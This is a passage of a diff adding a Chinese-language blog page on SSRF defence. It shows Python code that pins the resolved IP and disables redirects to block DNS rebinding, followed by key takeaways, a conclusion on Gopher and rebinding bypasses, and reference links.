+            <span class="k">raise</span> <span class="ne">ValueError</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Resolved IP </span><span class="si">{</span><span class="n">ip</span><span class="si">}</span><span class="s2"> is not allowed&quot;</span><span class="p">)</span>
+
+    <span class="c1"># 5. 使用解析后的 IP 直接连接，不再依赖 DNS</span>
+    <span class="c1"># 这一步是防御 DNS 重绑定的核心！</span>
+    <span class="c1"># 获取第一个解析到的公网 IP</span>
+    <span class="n">target_ip</span> <span class="o">=</span> <span class="n">addr_info</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">4</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span>
+
+    <span class="c1"># 6. 构造新的 URL，使用 IP 直接连接，Host header 保留原域名</span>
+    <span class="c1"># 这样避免了第二次 DNS 查询</span>
+    <span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
+    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;Host&#39;</span><span class="p">:</span> <span class="n">hostname</span><span class="p">}</span>
+
+    <span class="c1"># 7. 不跟随重定向</span>
+    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span>
+        <span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">parsed</span><span class="o">.</span><span class="n">scheme</span><span class="si">}</span><span class="s2">://</span><span class="si">{</span><span class="n">target_ip</span><span class="si">}{</span><span class="n">parsed</span><span class="o">.</span><span class="n">path</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">,</span>
+        <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span>
+        <span class="n">allow_redirects</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span>  <span class="c1"># 禁止跟随重定向！</span>
+        <span class="n">timeout</span><span class="o">=</span><span class="mi">5</span>
+    <span class="p">)</span>
+
+    <span class="k">return</span> <span class="n">response</span>
+</code></pre></div>
+
+<p><strong>核心要点</strong>：
+1. <strong>解析后锁定 IP</strong>：DNS 解析一次后，后续用 IP 直接连接，不再给 DNS 重绑定机会
+2. <strong>禁止跟随重定向</strong>：302 跳转是最常见的协议绕过手段
+3. <strong>白名单优于黑名单</strong>：只允许已知的、安全的域名/IP
+4. <strong>内网服务强制认证</strong>：Redis、K8s API、ElasticSearch 等必须设置密码/TLS</p>
+<blockquote>
+<p><strong>核心结论</strong>：三层 SSRF 防护被击穿的关键教训是——<strong>任何依赖"检查后再请求"的防御都存在时间窗口攻击的可能</strong>。正确的做法是解析域名后立即锁定 IP，且禁止跟随重定向。DNS 重绑定和 Gopher 协议的组合拳之所以有效，正是因为它精准利用了"检查阶段"和"请求阶段"之间的时间差。</p>
+</blockquote>
+<h2>参考来源</h2>
+<ol>
+<li>FreeBuf / CSDN, <em>SSRF漏洞攻防全景解析：从挖掘实战到防御体系构建</em>, 2026 — <a href="https://blog.csdn.net/weixin_42376192/article/details/156142749">原文链接</a></li>
+<li>博客园, <em>SSRF DNS重绑定绕过法</em>, 2026 — <a href="https://www.cnblogs.com/dollaikun/p/20627124">原文链接</a></li>
+<li>博客园, <em>SSRF——服务端请求伪造</em>, 2026 — <a href="https://www.cnblogs.com/bonelee/p/14292901.html">原文链接</a></li>
+</ol>
+<div class="back"><a href="../">← Back to Home</a></div>
+</article>
+</main>
+<footer>Powered by GitHub Pages 2026</footer>
+</body>
+</html>
